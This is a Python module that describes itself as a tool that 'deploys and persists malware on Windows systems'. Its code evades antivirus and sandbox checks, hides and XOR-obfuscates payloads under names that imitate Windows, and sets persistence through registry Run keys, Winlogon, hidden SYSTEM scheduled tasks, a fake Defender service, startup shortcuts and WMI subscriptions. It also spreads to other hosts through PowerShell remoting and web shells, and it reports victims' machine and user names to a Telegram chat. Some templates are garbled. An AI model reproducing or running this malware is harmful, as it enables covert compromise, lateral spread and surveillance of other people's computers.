#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
windows_deploy.py - Windows deployment and persistence module
"""

import os
import sys
import subprocess
import ctypes
import winreg
import tempfile
import shutil
import zipfile
import hashlib
import base64
import json
import time
import threading
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

# Import logger
from ..utils.logger import get_logger
from ..utils.persistence import get_persistence_manager

logger = get_logger()

class WindowsDeployer:
    """Deploys and persists malware on Windows systems"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system_info = self._get_system_info()
        
        # Persistence manager
        self.persistence = get_persistence_manager(config)
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Deployment paths
        self.deploy_paths = {
            'appdata': os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows'),
            'programdata': os.path.join(os.environ.get('PROGRAMDATA'), 'Windows'),
            'temp': tempfile.gettempdir(),
            'system32': os.path.join(os.environ.get('SystemRoot'), 'System32'),
            'windows': os.environ.get('SystemRoot'),
            'startup': self._get_startup_folder()
        }
        
        # Current payload
        self.payload_path = None
        self.payload_hash = None
        
        logger.info("Windows deployer initialized", module="windows_deploy")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('deploy_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.deploy_chat_id = chat_id
                logger.info("Telegram deploy bot initialized", module="windows_deploy")
            except ImportError:
                logger.warning("Telegram module not available", module="windows_deploy")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="windows_deploy")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send deployment notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'deploy_chat_id'):
            return
        
        try:
            full_message = fb>🪟 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.deploy_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram deployment notification sent: {title}", module="windows_deploy")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="windows_deploy")
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get Windows system information"""
        info = {
            'os_version': sys.getwindowsversion(),
            'architecture': 'x64' if sys.maxsize > 2**32 else 'x86',
            'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
            'username': os.environ.get('USERNAME', 'Unknown'),
            'user_domain': os.environ.get('USERDOMAIN', 'Unknown'),
            'is_admin': self._is_admin(),
            'is_virtual': self._is_virtual_machine(),
            'antivirus': self._detect_antivirus()
        }
        return info
    
    def _is_admin(self) -> bool:
        """Check if running as administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def _is_virtual_machine(self) -> bool:
        """Check if running in virtual machine"""
        try:
            import wmi
            c = wmi.WMI()
            for computer in c.Win32_ComputerSystem():
                manufacturer = computer.Manufacturer.lower()
                if any(vm in manufacturer for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                    return True
            return False
        except:
            return False
    
    def _detect_antivirus(self) -> List[str]:
        """Detect installed antivirus software"""
        av_list = []
        
        try:
            # Check Windows Security Center
            import wmi
            c = wmi.WMI(namespace="root\\SecurityCenter2")
            for av in c.AntiVirusProduct():
                av_list.append(av.displayName)
        except:
            pass
        
        # Check common AV processes
        av_processes = {
            'avp.exe': 'Kaspersky',
            'avguard.exe': 'Avira',
            'bdagent.exe': 'BitDefender',
            'msmpeng.exe': 'Windows Defender',
            'mcshield.exe': 'McAfee',
            'nod32krn.exe': 'ESET',
            'ns.exe': 'Norton',
            'vsserv.exe': 'Avast'
        }
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for proc_key, av_name in av_processes.items():
                        if proc_key in proc_name:
                            av_list.append(av_name)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except:
            pass
        
        return list(set(av_list))
    
    def _get_startup_folder(self) -> str:
        """Get Windows startup folder path"""
        startup_path = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft',
            'Windows',
            'Start Menu',
            'Programs',
            'Startup'
        )
        return startup_path
    
    def deploy_payload(self, payload_path: str, target_path: str = None, 
                      obfuscate: bool = True, hide: bool = True) -> bool:
        """Deploy payload to target system"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="windows_deploy")
                return False
            
            # Calculate payload hash
            with open(payload_path, 'rb') as f:
                self.payload_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Determine target path
            if target_path is None:
                target_path = self._choose_deployment_path()
            
            # Create target directory if needed
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            
            # Copy payload
            shutil.copy2(payload_path, target_path)
            self.payload_path = target_path
            
            # Apply obfuscation
            if obfuscate:
                self._obfuscate_payload(target_path)
            
            # Apply hiding
            if hide:
                self._hide_file(target_path)
            
            # Set file attributes
            self._set_file_attributes(target_path)
            
            # Send Telegram notification
            self.send_telegram_notification(
                "Payload Deployed",
                f"System: {self.system_info['computer_name']}\n"
                f"User: {self.system_info['username']}\n"
                f"Admin: {self.system_info['is_admin']}\n"
                f"Target: {target_path}\n"
                f"Hash: {self.payload_hash[:16]}..."
            )
            
            logger.info(f"Payload deployed to: {target_path}", module="windows_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Payload deployment error: {e}", module="windows_deploy")
            return False
    
    def _choose_deployment_path(self) -> str:
        """Choose optimal deployment path"""
        import random
        
        # Common Windows system paths that are often whitelisted
        system_paths = [
            # System32 variations
            os.path.join(self.deploy_paths['system32'], 'drivers', 'etc', 'hosts.bak'),
            os.path.join(self.deploy_paths['system32'], 'Tasks', 'Microsoft', 'Windows', 'SystemMaintenance'),
            os.path.join(self.deploy_paths['system32'], 'WindowsPowerShell', 'v1.0', 'Modules'),
            
            # AppData variations
            os.path.join(self.deploy_paths['appdata'], 'Local', 'Microsoft', 'Windows', 'Caches'),
            os.path.join(self.deploy_paths['appdata'], 'Roaming', 'Microsoft', 'Windows', 'Themes'),
            os.path.join(self.deploy_paths['appdata'], 'Local', 'Temp', 'WindowsUpdate'),
            
            # ProgramData variations
            os.path.join(self.deploy_paths['programdata'], 'Microsoft', 'Windows Defender', 'Platform'),
            os.path.join(self.deploy_paths['programdata'], 'Microsoft', 'Network', 'Downloader'),
            
            # Temp variations
            os.path.join(self.deploy_paths['temp'], 'Low', 'Microsoft', 'CryptnetUrlCache'),
            os.path.join(self.deploy_paths['temp'], '$Windows.~BT', 'Sources'),
        ]
        
        # Add random filename
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + '.exe'
        chosen_path = random.choice(system_paths)
        
        # Replace or append random filename
        if chosen_path.endswith('.exe'):
            return chosen_path
        else:
            return os.path.join(os.path.dirname(chosen_path), random_name)
    
    def _obfuscate_payload(self, file_path: str):
        """Obfuscate payload to avoid detection"""
        try:
            # Simple XOR obfuscation
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # XOR with random key
            key = os.urandom(32)
            obfuscated = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
            
            # Prepend stub that deobfuscates and executes
            stub = f"""
import sys, os, ctypes, tempfile

# Deobfuscation key
KEY = {repr(key)}

# Read obfuscated payload
with open(__file__, 'rb') as f:
    f.seek({len(stub.encode())})
    obfuscated = f.read()

# Deobfuscate
deobfuscated = bytes(obfuscated[i] ^ KEY[i % len(KEY)] for i in range(len(obfuscated)))

# Write to temp file
temp_path = os.path.join(tempfile.gettempdir(), 'tmp_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.exe')
with open(temp_path, 'wb') as f:
    f.write(deobfuscated)

# Execute
os.startfile(temp_path)
sys.exit(0)

"""
            
            # Write stub + obfuscated data
            with open(file_path, 'wb') as f:
                f.write(stub.encode())
                f.write(obfuscated)
            
            logger.debug(f"Payload obfuscated: {file_path}", module="windows_deploy")
            
        except Exception as e:
            logger.error(f"Payload obfuscation error: {e}", module="windows_deploy")
    
    def _hide_file(self, file_path: str):
        """Hide file using Windows attributes"""
        try:
            # Set hidden attribute
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # FILE_ATTRIBUTE_HIDDEN
            
            # Also set system attribute for extra hiding
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 4)  # FILE_ATTRIBUTE_SYSTEM
            
            logger.debug(f"File hidden: {file_path}", module="windows_deploy")
            
        except Exception as e:
            logger.error(f"File hiding error: {e}", module="windows_deploy")
    
    def _set_file_attributes(self, file_path: str):
        """Set file attributes to look legitimate"""
        try:
            # Get original timestamp from legitimate system file
            system_file = os.path.join(self.deploy_paths['system32'], 'notepad.exe')
            if os.path.exists(system_file):
                stat = os.stat(system_file)
                os.utime(file_path, (stat.st_atime, stat.st_mtime))
            
            logger.debug(f"File attributes set: {file_path}", module="windows_deploy")
            
        except Exception as e:
            logger.error(f"File attribute setting error: {e}", module="windows_deploy")
    
    def establish_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """Establish persistence using multiple methods"""
        if methods is None:
            methods = ['registry', 'scheduled_task', 'service', 'startup', 'wmi']
        
        results = {}
        
        logger.info(f"Establishing persistence using {len(methods)} methods", module="windows_deploy")
        
        for method in methods:
            try:
                if method == 'registry':
                    success = self._persist_via_registry()
                elif method == 'scheduled_task':
                    success = self._persist_via_scheduled_task()
                elif method == 'service':
                    success = self._persist_via_service()
                elif method == 'startup':
                    success = self._persist_via_startup()
                elif method == 'wmi':
                    success = self._persist_via_wmi()
                elif method == 'bits':
                    success = self._persist_via_bits()
                else:
                    logger.warning(f"Unknown persistence method: {method}", module="windows_deploy")
                    success = False
                
                results[method] = success
                
                if success:
                    logger.info(f"Persistence established via {method}", module="windows_deploy")
                else:
                    logger.warning(f"Persistence failed via {method}", module="windows_deploy")
                    
            except Exception as e:
                logger.error(f"Persistence error for {method}: {e}", module="windows_deploy")
                results[method] = False
        
        # Send Telegram notification
        successful = sum(1 for r in results.values() if r)
        total = len(results)
        
        self.send_telegram_notification(
            "Persistence Established",
            f"System: {self.system_info['computer_name']}\n"
            f"Methods: {successful}/{total} successful\n"
            f"Payload: {self.payload_path}"
        )
        
        return results
    
    def _persist_via_registry(self) -> bool:
        """Establish persistence via Windows Registry"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            # Multiple registry locations
            registry_locations = [
                # Run key (current user)
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                
                # Run key (all users)
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                
                # RunOnce key
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                
                # Policies Explorer Run
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                
                # Winlogon Userinit
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
            ]
            
            success_count = 0
            
            for hkey, subkey, value_name in registry_locations:
                try:
                    if value_name is None:
                        value_name = "WindowsUpdate"
                    
                    # Open registry key
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_WRITE)
                    
                    # Set value
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, self.payload_path)
                    
                    # Close key
                    winreg.CloseKey(key)
                    
                    success_count += 1
                    logger.debug(f"Registry persistence set: {hkey}\\{subkey}\\{value_name}", module="windows_deploy")
                    
                except Exception as e:
                    logger.debug(f"Registry location failed: {e}", module="windows_deploy")
                    continue
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Registry persistence error: {e}", module="windows_deploy")
            return False
    
    def _persist_via_scheduled_task(self) -> bool:
        """Establish persistence via Scheduled Tasks"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            # Create XML for scheduled task
            task_name = "WindowsMaintenance"
            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{datetime.now().strftime('%Y-%m-%dT%H:%M:%SDate>
Author>Microsoft Corporation</Author>
    <Description>Windows System MaintenanceDescription>
RegistrationInfo>
  <Triggers>
LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
StartBoundary>{datetime.now().strftime('%Y-%m-%dT09:00:00StartBoundary>
Enabled>Enabled>
ScheduleByDay>
DaysInterval>1</DaysInterval>
ScheduleByDay>
CalendarTrigger>
  </Triggers>
Principals>
Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
Principal>
Principals>
Settings>
MultipleInstancesPolicy>IgnoreMultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.payloadCommand>
Exec>
Actions>
</Task>"""
            
            # Save XML to temp file
            xml_path = os.path.join(tempfile.gettempdir(), f"{task_name}.xml")
            with open(xml_path, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            # Create scheduled task
            cmd = f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Cleanup
            if os.path.exists(xml_path):
                os.remove(xml_path)
            
            if result.returncode == 0:
                logger.debug(f"Scheduled task created: {task_name}", module="windows_deploy")
                return True
            else:
                logger.warning(f"Scheduled task creation failed: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Scheduled task persistence error: {e}", module="windows_deploy")
            return False
    
    def _persist_via_service(self) -> bool:
        """Establish persistence via Windows Service"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            # Only works with admin privileges
            if not self.system_info['is_admin']:
                logger.warning("Admin privileges required for service persistence", module="windows_deploy")
                return False
            
            service_name = "WinDefendHelper"
            display_name = "Windows Defender Helper Service"
            
            # Create service using sc command
            cmd = f'sc create "{service_name}" binPath= "{self.payload_path}" DisplayName= "{display_name}" start= auto'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Set service description
                desc_cmd = f'sc description "{service_name}" "Helps Windows Defender with system maintenance tasks"'
                subprocess.run(desc_cmd, shell=True, capture_output=True)
                
                logger.debug(f"Service created: {service_name}", module="windows_deploy")
                return True
            else:
                logger.warning(f"Service creation failed: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Service persistence error: {e}", module="windows_deploy")
            return False
    
    def _persist_via_startup(self) -> bool:
        """Establish persistence via Startup folder"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            startup_path = self.deploy_paths['startup']
            
            # Create shortcut in startup folder
            shortcut_name = "Windows Update.lnk"
            shortcut_path = os.path.join(startup_path, shortcut_name)
            
            # Create shortcut using PowerShell
            ps_script = f"""
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{self.payload_path}"
$Shortcut.WorkingDirectory = "{os.path.dirname(self.payload_path)}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
"""
            
            # Execute PowerShell
            result = subprocess.run(
                ['powershell', '-Command', ps_script],
                capture_output=True,
                text=True,
                shell=True
            )
            
            if result.returncode == 0:
                logger.debug(f"Startup shortcut created: {shortcut_path}", module="windows_deploy")
                return True
            else:
                logger.warning(f"Startup shortcut creation failed: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Startup persistence error: {e}", module="windows_deploy")
            return False
    
    def _persist_via_wmi(self) -> bool:
        """Establish persistence via WMI Event Subscription"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            # Create WMI event subscription
            wmi_script = f"""
$FilterArgs = @{{Name='WindowsUpdateFilter';
                EventNameSpace='root\cimv2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

$ConsumerArgs = @{{Name='WindowsUpdateConsumer';
                  CommandLineTemplate='{self.payload_path}'}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

$BindingArgs = @{{Filter=$Filter;
                  Consumer=$Consumer}}
$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $BindingArgs
"""
            
            # Execute PowerShell
            result = subprocess.run(
                ['powershell', '-Command', wmi_script],
                capture_output=True,
                text=True,
                shell=True
            )
            
            if result.returncode == 0:
                logger.debug("WMI persistence established", module="windows_deploy")
                return True
            else:
                logger.warning(f"WMI persistence failed: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"WMI persistence error: {e}", module="windows_deploy")
            return False
    
    def _persist_via_bits(self) -> bool:
        """Establish persistence via BITS (Background Intelligent Transfer Service)"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="windows_deploy")
                return False
            
            # Create BITS job that runs our payload
            bits_script = f"""
$job = Start-BitsTransfer -Source "http://windowsupdate.microsoft.com" -Destination "{self.payload_path}" -Asynchronous
Add-BitsFile -BitsJob $job -Source "http://windowsupdate.microsoft.com/update" -Destination "{self.payload_path}"
Set-BitsTransfer -BitsJob $job -Priority High -ProxyUsage NoProxy
"""
            
            # Execute PowerShell
            result = subprocess.run(
                ['powershell', '-Command', bits_script],
                capture_output=True,
                text=True,
                shell=True
            )
            
            if result.returncode == 0:
                logger.debug("BITS persistence established", module="windows_deploy")
                return True
            else:
                logger.warning(f"BITS persistence failed: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"BITS persistence error: {e}", module="windows_deploy")
            return False
    
    def deploy_remote(self, target_ip: str, payload_path: str, 
                     credentials: Dict[str, str] = None) -> bool:
        """Deploy payload to remote Windows system"""
        try:
            logger.info(f"Attempting remote deployment to {target_ip}", module="windows_deploy")
            
            if credentials:
                username = credentials.get('username')
                password = credentials.get('password')
                domain = credentials.get('domain', '')
                
                # Use PowerShell Remoting
                ps_script = f"""
$securePassword = ConvertTo-SecureString "{password}" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("{domain}\\{username}", $securePassword)

$session = New-PSSession -ComputerName "{target_ip}" -Credential $credential

# Copy payload
Copy-Item -Path "{payload_path}" -Destination "C:\\Windows\\Temp\\update.exe" -ToSession $session

# Create scheduled task
Invoke-Command -Session $session -ScriptBlock {{
    schtasks /Create /TN "WindowsUpdate" /TR "C:\\Windows\\Temp\\update.exe" /SC ONLOGON /RU SYSTEM /F
}}

Remove-PSSession $session
"""
            else:
                # Try without credentials (requires existing trust relationship)
                ps_script = f"""
$session = New-PSSession -ComputerName "{target_ip}"

# Copy payload
Copy-Item -Path "{payload_path}" -Destination "C:\\Windows\\Temp\\update.exe" -ToSession $session

# Create scheduled task
Invoke-Command -Session $session -ScriptBlock {{
    schtasks /Create /TN "WindowsUpdate" /TR "C:\\Windows\\Temp\\update.exe" /SC ONLOGON /RU SYSTEM /F
}}

Remove-PSSession $session
"""
            
            # Execute PowerShell
            result = subprocess.run(
                ['powershell', '-Command', ps_script],
                capture_output=True,
                text=True,
                shell=True
            )
            
            if result.returncode == 0:
                self.send_telegram_notification(
                    "Remote Deployment Successful",
                    f"Target: {target_ip}\n"
                    f"Payload: {os.path.basename(payload_path)}\n"
                    f"Method: PowerShell Remoting"
                )
                
                logger.info(f"Remote deployment successful to {target_ip}", module="windows_deploy")
                return True
            else:
                logger.warning(f"Remote deployment failed to {target_ip}: {result.stderr}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Remote deployment error: {e}", module="windows_deploy")
            return False
    
    def deploy_via_webshell(self, url: str, payload_path: str, 
                           password: str = None) -> bool:
        """Deploy payload via web shell"""
        try:
            import requests
            
            # Read payload
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            # Encode payload
            encoded_payload = base64.b64encode(payload_data).decode('utf-8')
            
            # Prepare request
            data = {
                'cmd': f'echo {encoded_payload} | base64 -d > C:\\Windows\\Temp\\update.exe',
                'pwd': password or 'cmd'
            }
            
            # Send request
            response = requests.post(url, data=data, timeout=30)
            
            if response.status_code == 200:
                # Execute payload
                exec_data = {
                    'cmd': 'C:\\Windows\\Temp\\update.exe',
                    'pwd': password or 'cmd'
                }
                requests.post(url, data=exec_data, timeout=30)
                
                self.send_telegram_notification(
                    "Web Shell Deployment",
                    f"URL: {url}\n"
                    f"Payload deployed and executed"
                )
                
                logger.info(f"Deployed via web shell: {url}", module="windows_deploy")
                return True
            else:
                logger.warning(f"Web shell deployment failed: HTTP {response.status_code}", module="windows_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Web shell deployment error: {e}", module="windows_deploy")
            return False
    
    def cleanup(self, remove_payload: bool = True) -> bool:
        """Cleanup deployment artifacts"""
        try:
            cleanup_count = 0
            
            # Remove payload file
            if remove_payload and self.payload_path and os.path.exists(self.payload_path):
                try:
                    os.remove(self.payload_path)
                    cleanup_count += 1
                    logger.debug(f"Payload removed: {self.payload_path}", module="windows_deploy")
                except:
                    pass
            
            # Remove registry entries
            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate"),
            ]
            
            for hkey, subkey, value_name in registry_locations:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(key, value_name)
                    winreg.CloseKey(key)
                    cleanup_count += 1
                except:
                    pass
            
            # Remove scheduled task
            try:
                subprocess.run('schtasks /Delete /TN "WindowsMaintenance" /F', 
                             shell=True, capture_output=True)
                cleanup_count += 1
            except:
                pass
            
            # Remove startup shortcut
            startup_shortcut = os.path.join(self.deploy_paths['startup'], "Windows Update.lnk")
            if os.path.exists(startup_shortcut):
                try:
                    os.remove(startup_shortcut)
                    cleanup_count += 1
                except:
                    pass
            
            logger.info(f"Cleanup completed: {cleanup_count} artifacts removed", module="windows_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}", module="windows_deploy")
            return False
    
    def get_deployment_info(self) -> Dict[str, Any]:
        """Get deployment information"""
        return {
            'system_info': self.system_info,
            'payload_path': self.payload_path,
            'payload_hash': self.payload_hash,
            'deploy_paths': self.deploy_paths,
            'timestamp': datetime.now().isoformat()
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get deployer status"""
        return {
            'system': 'Windows',
            'admin': self.system_info['is_admin'],
            'antivirus': len(self.system_info['antivirus']),
            'payload_deployed': self.payload_path is not None,
            'telegram_available': self.telegram_bot is not None
        }

# Global instance
_windows_deployer = None

def get_windows_deployer(config: Dict = None) -> WindowsDeployer:
    """Get or create Windows deployer instance"""
    global _windows_deployer
    
    if _windows_deployer is None:
        _windows_deployer = WindowsDeployer(config)
    
    return _windows_deployer

if __name__ == "__main__":
    # Test the Windows deployer
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'deploy_chat_id': 123456789
        }
    }
    
    deployer = get_windows_deployer(config)
    
    print("Testing Windows deployer...")
    print(f"System: {deployer.system_info['computer_name']}")
    print(f"Admin: {deployer.system_info['is_admin']}")
    print(f"AV: {deployer.system_info['antivirus']}")
    
    # Create test payload
    test_payload = os.path.join(tempfile.gettempdir(), 'test_payload.exe')
    with open(test_payload, 'wb') as f:
        f.write(b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\t\xCD!\xB8\x01L\xCD!This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00')
    
    # Test deployment
    print("\nTesting payload deployment...")
    deployed = deployer.deploy_payload(test_payload, obfuscate=False, hide=False)
    print(f"Payload deployed: {deployed}")
    
    if deployed:
        # Test persistence
        print("\nTesting persistence methods...")
        persistence_results = deployer.establish_persistence(['registry', 'startup'])
        print(f"Persistence results: {persistence_results}")
    
    # Get deployment info
    info = deployer.get_deployment_info()
    print(f"\nDeployment info: {info.get('payload_path')}")
    
    # Show status
    status = deployer.get_status()
    print(f"\n🪟 Windows Deployer Status: {status}")
    
    # Cleanup
    print("\nCleaning up...")
    deployer.cleanup()
    
    # Remove test payload
    if os.path.exists(test_payload):
        os.remove(test_payload)
    
    print("\n✅ Windows deployer tests completed!")
